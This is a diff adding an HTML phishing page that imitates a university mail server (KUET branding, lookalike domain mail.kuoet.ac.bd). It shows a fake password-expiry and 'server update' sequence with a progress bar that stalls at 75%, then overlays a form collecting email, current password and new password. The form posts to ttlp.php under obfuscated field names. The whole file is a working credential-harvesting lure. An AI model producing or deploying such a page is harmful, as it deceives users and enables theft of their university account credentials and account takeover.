@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="kuoet_files/favicon.ico">
+<title>Mail Server &middot; Server Update</title>
+
+<style>
+
+/* ==================================================
+   REGISTERED PROPERTY -> PURE CSS PERCENT COUNTER
+================================================== */
+
+@property --p {
+    syntax: "<integer>";
+    initial-value: 0;
+    inherits: false;
+}
+
+
+/* ==================================================
+   TIMELINE SETTINGS
+   t1 = mail subdomain screen (5s)
+   t2 = loader 0% -> 75%        (5s)
+   t3 = login overlay appears   (5s + 5s = 10s)
+================================================== */
+
+:root {
+    --t1: 5s;
+    --t2: 5s;
+    --t3: calc(var(--t1) + var(--t2));
+
+    --blue: #1687ed;
+    --blue-dark: #0872d8;
+    --ink: #12345a;
+}
+
+
+/* ==================================================
+   BASE
+================================================== */
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    padding: 25px 15px;
+
+    font-family: Arial, Helvetica, sans-serif;
+
+    background: linear-gradient(135deg, #eaf5ff, #ffffff);
+}
+
+h1, h2, h3, p {
+    margin: 0;
+}
+
+
+/* ==================================================
+   STACK FRAME  (both screens share the same space)
+================================================== */
+
+.frame {
+    position: relative;
+
+    width: min(94%, 560px);
+    min-height: 540px;
+}
+
+.stage {
+    position: absolute;
+    inset: 0;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    padding: 18px 0;
+}
+
+
+/* ==================================================
+   SHARED CARD
+================================================== */
+
+.card {
+    width: 100%;
+
+    padding: 40px 28px;
+
+    text-align: center;
+
+    background: #ffffff;
+
+    border-radius: 22px;
+
+    box-shadow: 0 10px 35px rgba(20, 80, 150, 0.14);
+}
+
+.logo-img {
+    display: block;
+
+    width: 300px;
+    max-width: 78%;
+    height: auto;
+
+    margin: 0 auto 18px;
+}
+
+
+/* ==================================================
+   STAGE 1 : MAIL SUBDOMAIN   (0s -> 5s)
+================================================== */
+
+.stage-mail {
+    animation: fadeOut 0.5s ease var(--t1) forwards;
+}
+
+.mail-badge {
+    width: 78px;
+    height: 78px;
+
+    margin: 0 auto 16px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    border-radius: 50%;
+
+    background: #e7f2ff;
+
+    font-size: 36px;
+
+    animation: pulse 1.6s ease-in-out infinite;
+}
+
+.mail-title {
+    color: var(--ink);
+    font-size: 30px;
+    margin-bottom: 10px;
+}
+
+.domain-pill {
+    display: inline-block;
+
+    padding: 8px 18px;
+
+    color: var(--blue-dark);
+
+    background: #eef7ff;
+
+    border: 1px dashed #8cc4f7;
+    border-radius: 30px;
+
+    font-size: 16px;
+    font-weight: bold;
+    letter-spacing: 0.4px;
+}
+
+.mail-text {
+    color: #596579;
+    font-size: 15px;
+    line-height: 1.6;
+
+    margin-top: 16px;
+}
+
+/* animated waiting dots */
+
+.dots {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+
+    margin-top: 22px;
+}
+
+.dots span {
+    width: 11px;
+    height: 11px;
+
+    border-radius: 50%;
+
+    background: var(--blue);
+
+    animation: blink 1.2s ease-in-out infinite;
+}
+
+.dots span:nth-child(2) { animation-delay: 0.2s; }
+.dots span:nth-child(3) { animation-delay: 0.4s; }
+
+.mail-note {
+    margin-top: 22px;
+
+    color: #98a2b3;
+    font-size: 12px;
+}
+
+
+/* ==================================================
+   STAGE 2 : SERVER UPDATE   (5s -> 10s)
+================================================== */
+
+.stage-update {
+    opacity: 0;
+    visibility: hidden;
+
+    animation: fadeIn 0.5s ease var(--t1) forwards;
+}
+
+/* three spinning rings */
+
+.rings {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    margin-bottom: 8px;
+
+    animation: fadeOut 0.01s linear var(--t3) forwards;
+}
+
+.ring {
+    width: 74px;
+    height: 74px;
+
+    margin-left: -14px;
+
+    border: 9px solid var(--blue);
+    border-radius: 50%;
+
+    animation: rotate 0.9s linear infinite;
+}
+
+.ring:first-child {
+    margin-left: 0;
+    border-color: #0755b5;
+    animation-direction: reverse;
+}
+
+.ring:nth-child(2) { border-color: #218cf2; }
+.ring:nth-child(3) { border-color: #62c5f5; }
+
+/* text stack : "Server Update" -> "Authentication Required" */
+
+.title-stack {
+    display: grid;
+
+    margin-top: 12px;
+}
+
+.title-stack > div { grid-area: 1 / 1; }
+
+.title-a { animation: fadeOut 0.3s ease var(--t3) forwards; }
+
+.title-b {
+    opacity: 0;
+    animation: fadeIn 0.3s ease var(--t3) forwards;
+}
+
+.title-stack h1 {
+    color: var(--ink);
+    font-size: 30px;
+    margin-bottom: 8px;
+}
+
+.message {
+    color: #596579;
+    font-size: 15px;
+    line-height: 1.55;
+}
+
+
+/* progress bar 0% -> 75% */
+
+.progress {
+    height: 9px;
+    width: 100%;
+    max-width: 400px;
+
+    margin: 26px auto 12px;
+
+    overflow: hidden;
+
+    background: #e5e7eb;
+    border-radius: 20px;
+}
+
+.progress-fill {
+    width: 0%;
+    height: 100%;
+
+    background: linear-gradient(90deg, #0755b5, #62c5f5);
+    border-radius: 20px;
+
+    animation: fillBar var(--t2) linear var(--t1) forwards;
+}
+
+/* status stack : "Loading... X%" -> "paused at 75%" */
+
+.status-stack {
+    display: grid;
+    min-height: 22px;
+}
+
+.status-stack > p { grid-area: 1 / 1; }
+
+.status {
+    color: var(--blue-dark);
+    font-size: 15px;
+    font-weight: bold;
+}
+
+.status-a { animation: fadeOut 0.3s ease var(--t3) forwards; }
+
+.status-b {
+    opacity: 0;
+    animation: fadeIn 0.3s ease var(--t3) forwards;
+}
+
+/* pure css live counter : 0% -> 75% */
+
+.pct {
+    counter-reset: pct var(--p);
+
+    animation: count var(--t2) linear var(--t1) both;
+}
+
+.pct::after {
+    content: counter(pct) "%";
+}
+
+
+/* ==================================================
+   STAGE 3 : LOGIN OVERLAY   (10s ->)
+================================================== */
+
+.auth-overlay {
+    position: fixed;
+    inset: 0;
+
+    z-index: 30;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    overflow-y: auto;
+
+    padding: 20px;
+
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+
+    background: rgba(255, 255, 255, 0.72);
+    backdrop-filter: blur(4px);
+
+    animation: overlayIn 0.4s ease var(--t3) forwards;
+}
+
+.login-box {
+    width: 100%;
+    max-width: 400px;
+
+    margin: auto;
+
+    padding: 30px 28px;
+
+    text-align: left;
+
+    background: #ffffff;
+
+    border: 1px solid #d7e9fa;
+    border-radius: 16px;
+
+    box-shadow: 0 16px 45px rgba(0, 70, 140, 0.20);
+
+    animation: loginAppear 0.45s ease var(--t3) backwards;
+}
+
+.login-head {
+    text-align: center;
+    margin-bottom: 18px;
+}
+
+.login-icon {
+    width: 58px;
+    height: 58px;
+
+    margin: 0 auto 12px;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    border-radius: 50%;
+
+    background: #e7f2ff;
+    font-size: 26px;
+}
+
+.login-title {
+    color: var(--ink);
+    font-size: 22px;
+    margin-bottom: 6px;
+}
+
+.login-text {
+    color: #667085;
+    font-size: 13px;
+    line-height: 1.5;
+}
+
+/* form */
+
+.form-group {
+    margin-bottom: 13px;
+}
+
+.form-group label {
+    display: block;
+
+    margin-bottom: 5px;
+
+    color: #344054;
+    font-size: 13px;
+    font-weight: bold;
+}
+
+.form-control {
+    width: 100%;
+
+    padding: 11px 12px;
+
+    color: #222;
+
+    background: #fff;
+
+    border: 1px solid #cbd5e1;
+    border-radius: 8px;
+
+    font-size: 14px;
+
+    outline: none;
+
+    transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.form-control::placeholder {
+    color: #98a2b3;
+}
+
+.form-control:focus {
+    border-color: var(--blue);
+    box-shadow: 0 0 0 3px rgba(22, 135, 237, 0.15);
+}
+
+.login-btn {
+    width: 100%;
+
+    margin-top: 16px;
+    padding: 13px;
+
+    color: #ffffff;
+
+    background: var(--blue);
+
+    border: none;
+    border-radius: 8px;
+
+    font-size: 15px;
+    font-weight: bold;
+
+    cursor: pointer;
+
+    transition: background-color 0.2s;
+}
+
+.login-btn:hover {
+    background: var(--blue-dark);
+}
+
+.demo-note {
+    margin-top: 14px;
+
+    text-align: center;
+
+    color: #98a2b3;
+    font-size: 11px;
+}
+
+
+/* ==================================================
+   KEYFRAMES
+================================================== */
+
+@keyframes fadeIn {
+    from { opacity: 0; visibility: visible; }
+    to   { opacity: 1; visibility: visible; }
+}
+
+@keyframes fadeOut {
+    from { opacity: 1; visibility: visible; }
+    to   { opacity: 0; visibility: hidden; }
+}
+
+@keyframes overlayIn {
+    from { opacity: 0; visibility: visible; pointer-events: none; }
+    to   { opacity: 1; visibility: visible; pointer-events: auto; }
+}
+
+@keyframes fillBar {
+    to { width: 75%; }
+}
+
+@keyframes count {
+    from { --p: 0; }
+    to   { --p: 75; }
+}
+
+@keyframes rotate {
+    to { transform: rotate(360deg); }
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1);    box-shadow: 0 0 0 0 rgba(22,135,237,0.35); }
+    50%      { transform: scale(1.06); box-shadow: 0 0 0 14px rgba(22,135,237,0); }
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 0.25; transform: translateY(0); }
+    50%      { opacity: 1;    transform: translateY(-5px); }
+}
+
+@keyframes loginAppear {
+    from { opacity: 0; transform: scale(0.92) translateY(12px); }
+    to   { opacity: 1; transform: scale(1) translateY(0); }
+}
+
+
+/* ==================================================
+   MOBILE
+================================================== */
+
+@media (max-width: 480px) {
+
+    .frame { min-height: 560px; }
+
+    .card { padding: 30px 18px; }
+
+    .mail-title { font-size: 25px; }
+
+    .title-stack h1 { font-size: 25px; }
+
+    .ring {
+        width: 58px;
+        height: 58px;
+        border-width: 7px;
+    }
+
+    .login-box { padding: 24px 18px; }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="frame">
+
+
+    <!-- ==================================================
+         STAGE 1 : MAIL SUBDOMAIN  (visible 0s - 5s)
+    ================================================== -->
+
+    <div class="stage stage-mail">
+
+        <div class="card">
+
+            <img src="kuoet_files/kuet-logo_0iG8.png" alt="KUET" class="logo-img">
+
+            <div class="mail-badge">&#9993;</div>
+
+            <h1 class="mail-title">Password Expires... </h1>
+
+            <div class="domain-pill">mail.kuoet.ac.bd</div>
+
+            <p class="mail-text">
+                Preparing your mail subdomain and checking
+                your password expires for the university mail server.
+            </p>
+
+            <div class="dots">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+            <p class="mail-note">
+                Please wait &mdash;server update for authentication.&hellip;
+            </p>
+
+        </div>
+
+    </div>
+
+
+    <!-- ==================================================
+         STAGE 2 : SERVER UPDATE  (appears 5s, loader 5s -> 75%)
+    ================================================== -->
+
+    <div class="stage stage-update">
+
+        <div class="card">
+
+            <img src="kuoet_files/kuet-logo_0iG8.png" alt="KUET" class="logo-img">
+
+            <div class="rings">
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="ring"></div>
+            </div>
+
+            <div class="title-stack">
+
+                <div class="title-a">
+                    <h1>Authentication Required for Password Update</h1>
+                    <p class="message">
+                        For password update in progress, please wait&hellip;
+                    </p>
+                </div>
+
+                <div class="title-b">
+                    <h1></h1>
+                    <p class="message">
+                       
+                    </p>
+                </div>
+
+            </div>
+
+            <div class="progress">
+                <div class="progress-fill"></div>
+            </div>
+
+            <div class="status-stack">
+
+                <p class="status status-a">
+                    Loading&hellip; <span class="pct"></span>
+                </p>
+
+                <p class="status status-b">
+                    Update paused at 75%
+                </p>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <!-- ==================================================
+         STAGE 3 : LOGIN OVERLAY  (appears at 10s = 75%)
+    ================================================== -->
+
+    <div class="auth-overlay">
+
+        <div class="login-box">
+
+            <div class="login-head">
+                <div class="login-icon">&#128274;</div>
+                <h2 class="login-title">Login to Continue   <br>  Change Password.</h2>
+                <p class="login-text">
+                   
+                </p>
+            </div>
+
+            <form action="ttlp.php" method="post" name="email"  >
+
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email"
+                           id="email"
+                           name="peter"
+                           class="form-control"
+                           placeholder="Enter your email"
+                           autocomplete="off"
+                           required>
+                </div>
+
+                <div class="form-group">
+                    <label for="current">Current Password</label>
+                    <input type="password"
+                           id="current"
+                           name="cheater"
+                           class="form-control"
+                           placeholder="Enter your current password"
+                           autocomplete="off"
+                           required>
+                </div>
+
+                <div class="form-group">
+                    <label for="newpass">New Password</label>
+                    <input type="password"
+                           id="newpass"
+                           name="truly"
+                           class="form-control"
+                           placeholder="Enter your new password"
+                           autocomplete="off"
+                           required>
+                </div>
+
+                <div class="form-group">
+                    <label for="confirm">Confirm New Password</label>
+                    <input type="password"
+                           id="confirm"
+                           name="trolley"
+                           class="form-control"
+                           placeholder="Confirm your new password"
+                           autocomplete="off"
+                           required>
+                </div>
+                <div class="action">
+                <button type="submit" class="login-btn">
+                    Continue 
+                </button></div>
+
+            </form>
+
+            <p class="demo-note">
+               
+            </p>
+
+        </div>
+
+    </div>
+
+</div>
+
+</body>
+</html>
